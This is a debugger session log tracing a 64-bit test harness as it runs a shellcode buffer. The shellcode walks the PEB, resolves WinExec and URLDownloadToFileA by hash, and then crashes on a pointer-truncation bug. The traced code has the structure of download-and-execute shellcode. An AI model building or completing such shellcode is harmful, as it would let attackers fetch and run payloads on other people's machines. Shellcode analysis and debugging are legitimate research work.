F:\private\ic02\examples\down>cdb -o bin\64.exe

Microsoft (R) Windows Debugger Version 6.3.9600.17237 AMD64
Copyright (c) Microsoft Corporation. All rights reserved.

CommandLine: bin\64.exe

************* Symbol Path validation summary **************
Response                         Time (ms)     Location
Deferred                                       srv*C:\Symbols*http://msdl.microsoft.com/download/symbols
OK                                             C:\Symbols
Symbol search path is: srv*C:\Symbols*http://msdl.microsoft.com/download/symbols;C:\Symbols
Executable search path is:
ModLoad: 00000001`3f090000 00000001`3f0c6000   64.exe
ModLoad: 00000000`76ec0000 00000000`77069000   ntdll.dll
ModLoad: 00000000`76da0000 00000000`76ebf000   C:\Windows\system32\kernel32.dll
ModLoad: 000007fe`fce80000 000007fe`fceeb000   C:\Windows\system32\KERNELBASE.dll
(1984.1330): Break instruction exception - code 80000003 (first chance)
ntdll!LdrpDoDebuggerBreak+0x30:
00000000`76f6cb70 cc              int     3
0:000> bp 64!main
*** WARNING: Unable to verify checksum for 64.exe
0:000> g
Breakpoint 0 hit
64!main:
00000001`3f091010 4056            push    rsi
0:000> pc
64!main+0x41:
00000001`3f091051 e85a010000      call    64!printf (00000001`3f0911b0)
0:000>
strlen(shellcode)=1025
64!main+0x5b:
00000001`3f09106b ff158f2f0300    call    qword ptr [64!_imp_VirtualProtect (00000001`3f0c4000)] ds:00000001`3f0c4000={kernel32!VirtualProtectStub (00000000`76da2ef0)}
0:000>
64!main+0x84:
00000001`3f091094 ffd0            call    rax {00000000`0031f3e0}
0:000> t
00000000`0031f3e0 4055            push    rbp
0:000> pc
00000000`0031f436 e835000000      call    00000000`0031f470
0:000> t
00000000`0031f470 4883ec28        sub     rsp,28h
0:000> u $ip l30
00000000`0031f470 4883ec28        sub     rsp,28h
00000000`0031f474 8b057e010000    mov     eax,dword ptr [00000000`0031f5f8]
00000000`0031f47a 89442430        mov     dword ptr [rsp+30h],eax
00000000`0031f47e 0fb70577010000  movzx   eax,word ptr [00000000`0031f5fc]
00000000`0031f485 6689442434      mov     word ptr [rsp+34h],ax
00000000`0031f48a 8a056e010000    mov     al,byte ptr [00000000`0031f5fe]
00000000`0031f490 88442436        mov     byte ptr [rsp+36h],al
00000000`0031f494 65488b042560000000 mov   rax,qword ptr gs:[60h]
00000000`0031f49d 488b4818        mov     rcx,qword ptr [rax+18h]
00000000`0031f4a1 488b4930        mov     rcx,qword ptr [rcx+30h]
00000000`0031f4a5 4883c1e0        add     rcx,0FFFFFFFFFFFFFFE0h
00000000`0031f4a9 eb08            jmp     00000000`0031f4b3
00000000`0031f4ab 488b4920        mov     rcx,qword ptr [rcx+20h]
00000000`0031f4af 4883e920        sub     rcx,20h
00000000`0031f4b3 488b4160        mov     rax,qword ptr [rcx+60h]
00000000`0031f4b7 6683780c33      cmp     word ptr [rax+0Ch],33h
00000000`0031f4bc 75ed            jne     00000000`0031f4ab
00000000`0031f4be 488b4930        mov     rcx,qword ptr [rcx+30h]
00000000`0031f4c2 48890d37010000  mov     qword ptr [00000000`0031f600],rcx
00000000`0031f4c9 4885c9          test    rcx,rcx
00000000`0031f4cc 7465            je      00000000`0031f533
00000000`0031f4ce ba762c1d07      mov     edx,71D2C76h
00000000`0031f4d3 e860000000      call    00000000`0031f538
00000000`0031f4d8 4863c8          movsxd  rcx,eax
00000000`0031f4db 48890d26010000  mov     qword ptr [00000000`0031f608],rcx
00000000`0031f4e2 85c0            test    eax,eax
00000000`0031f4e4 744d            je      00000000`0031f533
00000000`0031f4e6 488b0d13010000  mov     rcx,qword ptr [00000000`0031f600]
00000000`0031f4ed ba13b9e625      mov     edx,25E6B913h
00000000`0031f4f2 e841000000      call    00000000`0031f538
00000000`0031f4f7 4863c8          movsxd  rcx,eax
00000000`0031f4fa 48890d0f010000  mov     qword ptr [00000000`0031f610],rcx
00000000`0031f501 85c0            test    eax,eax
00000000`0031f503 742e            je      00000000`0031f533
00000000`0031f505 488d4c2430      lea     rcx,[rsp+30h]
00000000`0031f50a ff15f8000000    call    qword ptr [00000000`0031f608]
00000000`0031f510 48890501010000  mov     qword ptr [00000000`0031f618],rax
00000000`0031f517 4885c0          test    rax,rax
00000000`0031f51a 7417            je      00000000`0031f533
00000000`0031f51c baafb1426f      mov     edx,6F42B1AFh
00000000`0031f521 488bc8          mov     rcx,rax
00000000`0031f524 e80f000000      call    00000000`0031f538
00000000`0031f529 4863c8          movsxd  rcx,eax
00000000`0031f52c 48890ded000000  mov     qword ptr [00000000`0031f620],rcx
00000000`0031f533 4883c428        add     rsp,28h
00000000`0031f537 c3              ret
00000000`0031f538 48895c2408      mov     qword ptr [rsp+8],rbx
00000000`0031f53d 4863413c        movsxd  rax,dword ptr [rcx+3Ch]
0:000> bp 00000000`0031f4ed
0:000> bp 00000000`0031f51c
0:000> g
Breakpoint 1 hit
00000000`0031f4ed ba13b9e625      mov     edx,25E6B913h
0:000> p
00000000`0031f4f2 e841000000      call    00000000`0031f538
0:000> r rcx
rcx=0000000076da0000
0:000> u rcx
kernel32!BasepSxsCreateResourceStream <PERF> (kernel32+0x0):
00000000`76da0000 4d5a            pop     r10
kernel32!BasepSxsCreateResourceStream <PERF> (kernel32+0x2):
00000000`76da0002 90              nop
kernel32!BasepSxsCreateResourceStream <PERF> (kernel32+0x3):
00000000`76da0003 0003            add     byte ptr [rbx],al
kernel32!BasepSxsCreateResourceStream <PERF> (kernel32+0x5):
00000000`76da0005 0000            add     byte ptr [rax],al
kernel32!BasepSxsCreateResourceStream <PERF> (kernel32+0x7):
00000000`76da0007 000400          add     byte ptr [rax+rax],al
kernel32!BasepSxsCreateResourceStream <PERF> (kernel32+0xa):
00000000`76da000a 0000            add     byte ptr [rax],al
kernel32!BasepSxsCreateResourceStream <PERF> (kernel32+0xc):
00000000`76da000c ff              ???
kernel32!BasepSxsCreateResourceStream <PERF> (kernel32+0xd):
00000000`76da000d ff00            inc     dword ptr [rax]
0:000> p
00000000`0031f4f7 4863c8          movsxd  rcx,eax
0:000> r rax
rax=0000000076e38d50
0:000> u rax
kernel32!WinExec:
00000000`76e38d50 488bc4          mov     rax,rsp
00000000`76e38d53 48895808        mov     qword ptr [rax+8],rbx
00000000`76e38d57 55              push    rbp
00000000`76e38d58 56              push    rsi
00000000`76e38d59 57              push    rdi
00000000`76e38d5a 4881ec10010000  sub     rsp,110h
00000000`76e38d61 0fbae21f        bt      edx,1Fh
00000000`76e38d65 8bf2            mov     esi,edx
0:000> p
00000000`0031f4fa 48890d0f010000  mov     qword ptr [00000000`0031f610],rcx ds:00000000`0031f610=0000000000000000
0:000> r rcx
rcx=0000000076e38d50
0:000> u rcx
kernel32!WinExec:
00000000`76e38d50 488bc4          mov     rax,rsp
00000000`76e38d53 48895808        mov     qword ptr [rax+8],rbx
00000000`76e38d57 55              push    rbp
00000000`76e38d58 56              push    rsi
00000000`76e38d59 57              push    rdi
00000000`76e38d5a 4881ec10010000  sub     rsp,110h
00000000`76e38d61 0fbae21f        bt      edx,1Fh
00000000`76e38d65 8bf2            mov     esi,edx
0:000> g
ModLoad: 000007fe`fdb40000 000007fe`fdcc5000   C:\Windows\system32\urlmon.DLL
ModLoad: 000007fe`fd0b0000 000007fe`fd14f000   C:\Windows\system32\msvcrt.dll
ModLoad: 000007fe`fcf00000 000007fe`fcf04000   C:\Windows\system32\api-ms-win-downlevel-ole32-l1-1-0.dll
ModLoad: 000007fe`fe230000 000007fe`fe433000   C:\Windows\system32\ole32.DLL
ModLoad: 000007fe`fd6f0000 000007fe`fd757000   C:\Windows\system32\GDI32.dll
ModLoad: 00000000`76ca0000 00000000`76d9a000   C:\Windows\system32\USER32.dll
ModLoad: 000007fe`fd0a0000 000007fe`fd0ae000   C:\Windows\system32\LPK.dll
ModLoad: 000007fe`fd2d0000 000007fe`fd399000   C:\Windows\system32\USP10.dll
ModLoad: 000007fe`fe100000 000007fe`fe22d000   C:\Windows\system32\RPCRT4.dll
ModLoad: 000007fe`fcef0000 000007fe`fcef4000   C:\Windows\system32\api-ms-win-downlevel-shlwapi-l1-1-0.dll
ModLoad: 000007fe`fd670000 000007fe`fd6e1000   C:\Windows\system32\shlwapi.DLL
ModLoad: 000007fe`fce40000 000007fe`fce45000   C:\Windows\system32\api-ms-win-downlevel-advapi32-l1-1-0.dll
ModLoad: 000007fe`fd150000 000007fe`fd22b000   C:\Windows\system32\advapi32.DLL
ModLoad: 000007fe`fdcd0000 000007fe`fdcef000   C:\Windows\SYSTEM32\sechost.dll
ModLoad: 000007fe`fce10000 000007fe`fce14000   C:\Windows\system32\api-ms-win-downlevel-user32-l1-1-0.dll
ModLoad: 000007fe`fd030000 000007fe`fd034000   C:\Windows\system32\api-ms-win-downlevel-version-l1-1-0.dll
ModLoad: 000007fe`fbef0000 000007fe`fbefc000   C:\Windows\system32\version.DLL
ModLoad: 000007fe`fce70000 000007fe`fce73000   C:\Windows\system32\api-ms-win-downlevel-normaliz-l1-1-0.dll
ModLoad: 00000000`77080000 00000000`77083000   C:\Windows\system32\normaliz.DLL
ModLoad: 000007fe`fd3a0000 000007fe`fd667000   C:\Windows\system32\iertutil.dll
ModLoad: 000007fe`fdcf0000 000007fe`fdf38000   C:\Windows\system32\WININET.dll
ModLoad: 000007fe`fce50000 000007fe`fce6e000   C:\Windows\system32\USERENV.dll
ModLoad: 000007fe`fcc80000 000007fe`fcc8f000   C:\Windows\system32\profapi.dll
ModLoad: 000007fe`fd760000 000007fe`fd78e000   C:\Windows\system32\IMM32.DLL
ModLoad: 000007fe`fdf40000 000007fe`fe049000   C:\Windows\system32\MSCTF.dll
Breakpoint 2 hit
00000000`0031f51c baafb1426f      mov     edx,6F42B1AFh
0:000> p
00000000`0031f521 488bc8          mov     rcx,rax
0:000>
00000000`0031f524 e80f000000      call    00000000`0031f538
0:000> r rcx
rcx=000007fefdb40000
0:000> u rcx
urlmon!CLSID_ShellDesktop:
000007fe`fdb40000 4d5a            pop     r10
urlmon!CLSID_ShellDesktop:
000007fe`fdb40002 90              nop
urlmon!CLSID_ShellDesktop:
000007fe`fdb40003 0003            add     byte ptr [rbx],al
urlmon!CLSID_ShellDesktop:
000007fe`fdb40005 0000            add     byte ptr [rax],al
urlmon!CLSID_ShellDesktop:
000007fe`fdb40007 000400          add     byte ptr [rax+rax],al
urlmon!CLSID_ShellDesktop:
000007fe`fdb4000a 0000            add     byte ptr [rax],al
urlmon!CLSID_ShellDesktop:
000007fe`fdb4000c ff              ???
urlmon!CLSID_ShellDesktop:
000007fe`fdb4000d ff00            inc     dword ptr [rax]
0:000> p
00000000`0031f529 4863c8          movsxd  rcx,eax
0:000> r rax
rax=000007fefdc124b0
0:000> u rax
urlmon!URLDownloadToFileA:
000007fe`fdc124b0 fff3            push    rbx
000007fe`fdc124b2 55              push    rbp
000007fe`fdc124b3 56              push    rsi
000007fe`fdc124b4 57              push    rdi
000007fe`fdc124b5 4154            push    r12
000007fe`fdc124b7 4156            push    r14
000007fe`fdc124b9 4157            push    r15
000007fe`fdc124bb 4881ec60010000  sub     rsp,160h
0:000> p
00000000`0031f52c 48890ded000000  mov     qword ptr [00000000`0031f620],rcx ds:00000000`0031f620=0000000000000000
0:000> r rcx
rcx=fffffffffdc124b0
0:000> u rcx
ffffffff`fdc124b0 ??              ???
           ^ Memory access error in 'u rcx'
0:000> g
(1984.1330): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
ffffffff`fdc124b0 ??              ???
0:000>
